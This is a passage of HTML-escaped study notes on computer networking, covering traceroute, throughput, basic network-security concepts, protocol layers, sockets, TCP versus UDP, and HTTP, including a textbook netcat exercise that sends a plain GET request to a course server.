        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;&lt;code&gt;traceroute&lt;/code&gt; program&lt;/p&gt;
&lt;p&gt;&lt;code&gt;traceroute&lt;/code&gt; will send sets (probe) of 3 packets with for all i = 1, to a TTL of 64 until the destination is reached. For each i, the packets are dropped by a router at the index i. The router at index i is not necessarily going to be the same for each packet. This program therefore allows inspecting/probing the network path.&lt;/p&gt;
&lt;p&gt;Reasons for different paths: routing table changes, load balancing&lt;/p&gt;
&lt;h3 id=&#34;throughput&#34; &gt;Throughput
&lt;span&gt;
    &lt;a href=&#34;#throughput&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;bits/time unit
&lt;ul&gt;
&lt;li&gt;instantaneous: any point in a time slot (what you would show in a software that downloads stuff for the user)&lt;/li&gt;
&lt;li&gt;average: rate over longer period of time (useful for performance)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Bottleneck Link
&lt;ul&gt;
&lt;li&gt;Which link is constraining the throughput&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;network-security&#34; &gt;Network Security
&lt;span&gt;
    &lt;a href=&#34;#network-security&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;internet was designed for trusted groups in mind, so designers are catching up&lt;/li&gt;
&lt;li&gt;all layers need to be protected&lt;/li&gt;
&lt;li&gt;packet sniffing
&lt;ul&gt;
&lt;li&gt;using wireshark, someone can inspect packets that are broadcasted by making their network card promiscuous (accept all packets instead of the default behaviour dropping ones that were not meant for the device). Especially harmful for unencrypted traffic&lt;/li&gt;
&lt;li&gt;IP spoofing: false source address can trick server into sending too much information to the real device&lt;/li&gt;
&lt;li&gt;Denial of Service
&lt;ul&gt;
&lt;li&gt;Overwhelm server with bogus traffic&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;layers-framework&#34; &gt;Layers Framework
&lt;span&gt;
    &lt;a href=&#34;#layers-framework&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;Why layers?&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;explicit structure allows identification, relationship of
system’s pieces&lt;/li&gt;
&lt;li&gt;modularization eases maintenance, updating of system&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;protocol-layers-and-reference-models&#34; &gt;Protocol layers and reference models
&lt;span&gt;
    &lt;a href=&#34;#protocol-layers-and-reference-models&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;hosts&lt;/li&gt;
&lt;li&gt;routers&lt;/li&gt;
&lt;li&gt;links of various media&lt;/li&gt;
&lt;li&gt;applications&lt;/li&gt;
&lt;li&gt;protocols&lt;/li&gt;
&lt;li&gt;hardware, software&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Example of layers is air travel&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ticket (purchase) → ticketing service → ticket (complain)&lt;/li&gt;
&lt;li&gt;baggage (check) → baggage service → baggage (claim)&lt;/li&gt;
&lt;li&gt;gates (load) → gate service → gate (unload)&lt;/li&gt;
&lt;li&gt;runway takeoff → runway service → runway landing&lt;/li&gt;
&lt;li&gt;airplane routing → routing service → airplane routing&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;chapter-2-application-layer-protocols&#34; &gt;Chapter 2 Application Layer Protocols
&lt;span&gt;
    &lt;a href=&#34;#chapter-2-application-layer-protocols&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;&lt;p&gt;World Wide Web (HTTP), File Transfer (FTP), Electronic Mail (SMTP), Domain Name System (DNS), Socket Programming.&lt;/p&gt;
&lt;h3 id=&#34;client-server-paradigm&#34; &gt;Client-server Paradigm
&lt;span&gt;
    &lt;a href=&#34;#client-server-paradigm&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Server
&lt;ul&gt;
&lt;li&gt;always-on host&lt;/li&gt;
&lt;li&gt;permanent IP address&lt;/li&gt;
&lt;li&gt;often in data centers, for scaling&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;client
&lt;ul&gt;
&lt;li&gt;contact, communicate with server&lt;/li&gt;
&lt;li&gt;may be intermittently connected&lt;/li&gt;
&lt;li&gt;may have dynamic IP Addresses&lt;/li&gt;
&lt;li&gt;do not communicate directly with each other&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;peer-peer-architecture&#34; &gt;Peer-peer Architecture
&lt;span&gt;
    &lt;a href=&#34;#peer-peer-architecture&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;no always-on server&lt;/li&gt;
&lt;li&gt;arbitrary end systems directly communicate&lt;/li&gt;
&lt;li&gt;peers request service from other peers, provide service in return to other peers&lt;/li&gt;
&lt;li&gt;self scalability - new peers bring new service capacity as well as new service demands&lt;/li&gt;
&lt;li&gt;peers are intermittently connected and change IP addresses&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;sockets&#34; &gt;Sockets
&lt;span&gt;
    &lt;a href=&#34;#sockets&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;Sockets are like doors on each of the processes that can send and receive messages relying on the transport infrastructure to deliver messages to socket on receiving process. Sockets can be UDP or TCP and can communicate within the same machine.&lt;/p&gt;
&lt;h3 id=&#34;addressing-processes&#34; &gt;Addressing Processes
&lt;span&gt;
    &lt;a href=&#34;#addressing-processes&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Each host device has unique 32-bit Internet Protocol address&lt;/li&gt;
&lt;li&gt;Ports are used to differentiate &lt;strong&gt;processes&lt;/strong&gt; running on the same host&lt;/li&gt;
&lt;li&gt;2^16 - 1 port numbers&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;application-layer-protocol&#34; &gt;Application Layer Protocol
&lt;span&gt;
    &lt;a href=&#34;#application-layer-protocol&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;types of messages (request, response)&lt;/li&gt;
&lt;li&gt;message syntax (fields to delineate)&lt;/li&gt;
&lt;li&gt;message semantics (meaning of field values)&lt;/li&gt;
&lt;li&gt;rules (when and how to do something)&lt;/li&gt;
&lt;li&gt;open protocols (RFCs)
&lt;ul&gt;
&lt;li&gt;Interoperability&lt;/li&gt;
&lt;li&gt;HTTP, SMTP&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Proprietary protocols
&lt;ul&gt;
&lt;li&gt;Skype, Zoom&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;transport-service-requirements&#34; &gt;Transport Service Requirements
&lt;span&gt;
    &lt;a href=&#34;#transport-service-requirements&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;data integrity&lt;/li&gt;
&lt;li&gt;throughput&lt;/li&gt;
&lt;li&gt;timing&lt;/li&gt;
&lt;li&gt;security&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;tcp-vs-udp&#34; &gt;TCP vs UDP
&lt;span&gt;
    &lt;a href=&#34;#tcp-vs-udp&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;Classes of services: reliability (TCP), throughput (not guaranteed), delivery time (not guaranteed), and confidentiality via encryption (not guaranteed).&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;TCP
&lt;ul&gt;
&lt;li&gt;reliable transport between sending and receiving process&lt;/li&gt;
&lt;li&gt;flow control: sender won&amp;rsquo;t overwhelm receiver&lt;/li&gt;
&lt;li&gt;congestion control: throttle sender when network overloaded&lt;/li&gt;
&lt;li&gt;connection-oriented: setup required between client and server processes&lt;/li&gt;
&lt;li&gt;does not provide: timing, minimum throughput guarantee, security&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;UDP
&lt;ul&gt;
&lt;li&gt;unreliable data transfer between sending and receiving process&lt;/li&gt;
&lt;li&gt;does not provide: reliability, flow control, congestion control, timing, throughput, guarantee, security, or connection setup&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Why does UDP exist?
&lt;ul&gt;
&lt;li&gt;to establish low-latency and loss-tolerating connections between applications on the internet&lt;/li&gt;
&lt;li&gt;there is no read (acknowledgement) receipt and no need for a TCP connection setup&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;tcp-security&#34; &gt;TCP Security
&lt;span&gt;
    &lt;a href=&#34;#tcp-security&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Transport Layer Security (TLS)
&lt;ul&gt;
&lt;li&gt;Encrypted connections&lt;/li&gt;
&lt;li&gt;data integrity&lt;/li&gt;
&lt;li&gt;end-point authentication&lt;/li&gt;
&lt;li&gt;Application layer&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;web-and-http&#34; &gt;Web and HTTP
&lt;span&gt;
    &lt;a href=&#34;#web-and-http&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;web page consists of objects&lt;/li&gt;
&lt;li&gt;objects: HTML file, JPEG image, Java applet, audio file&lt;/li&gt;
&lt;li&gt;web page contains base HTML-file which includes several
referenced objects, each addressable by a URL&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;hypertext-transfer-protocol-http&#34; &gt;Hypertext Transfer Protocol (HTTP)
&lt;span&gt;
    &lt;a href=&#34;#hypertext-transfer-protocol-http&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;client: browser that requests, receives, displays&lt;/li&gt;
&lt;li&gt;server:  Web server sends objects in response to requests&lt;/li&gt;
&lt;li&gt;stateless&lt;/li&gt;
&lt;li&gt;RTT: &lt;em&gt;Round Trip Time&lt;/em&gt;: time for a small packet to travel from client to server and back&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Non-Persistent&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;TCP connection opened&lt;/li&gt;
&lt;li&gt;at most one object sent
over TCP connection&lt;/li&gt;
&lt;li&gt;TCP connection closed&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;downloading multiple objects required multiple connections&lt;/li&gt;
&lt;li&gt;Per object: One RTT for TCP initiation, one RTT for request and return, object/file transmission time&lt;/li&gt;
&lt;li&gt;browsers open parallel TCP connections to fetch objects&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Persistent (HTTP 1.1)&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;TCP connection opened to a server&lt;/li&gt;
&lt;li&gt;multiple objects can be sent over single TCP connection between client, and that server&lt;/li&gt;
&lt;li&gt;TCP connection closed&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;send messages over initial connection&lt;/li&gt;
&lt;li&gt;as little as one RTT to request all the referenced objects, which cuts response time in half&lt;/li&gt;
&lt;li&gt;requires the content length header so that the client can segregate all the incoming data into their respective responses. For example, if the server is sending 3 responses, the client will use the content length to know when the second, third, and fourth responses start&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;http-request-message&#34; &gt;HTTP Request Message
&lt;span&gt;
    &lt;a href=&#34;#http-request-message&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;ASCII (human-readable format)&lt;/li&gt;
&lt;li&gt;Request line (GET, POST, HEAD commands)&lt;/li&gt;
&lt;li&gt;Fun fact, all ASCII text transmitted must use CR LF for EOL&lt;/li&gt;
&lt;li&gt;CR: carriage return&lt;/li&gt;
&lt;li&gt;LF: line feed&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;http-response-message&#34; &gt;HTTP Response Message
&lt;span&gt;
    &lt;a href=&#34;#http-response-message&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Status line (protocol, status code, status phrase)&lt;/li&gt;
&lt;li&gt;header&lt;/li&gt;
&lt;li&gt;data&lt;/li&gt;
&lt;li&gt;301 Moved Permanently&lt;/li&gt;
&lt;li&gt;505 HTTP Version Not Supported&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;manual-http-request&#34; &gt;Manual HTTP Request
&lt;span&gt;
    &lt;a href=&#34;#manual-http-request&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;Netcat&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;nc -Cv gaia.cs.umass.edu &lt;span style=&#34;color:#3677a9&#34;&gt;80&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;HTTP GET Request&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;GET /kurose_ross/interactive/index.php HTTP/1.1
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Host: gaia.cs.umass.edu
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;# Hit x2 CR&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;http2&#34; &gt;HTTP/2
&lt;span&gt;
    &lt;a href=&#34;#http2&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Key goal: decreased delay in multi-object HTTP requests&lt;/li&gt;
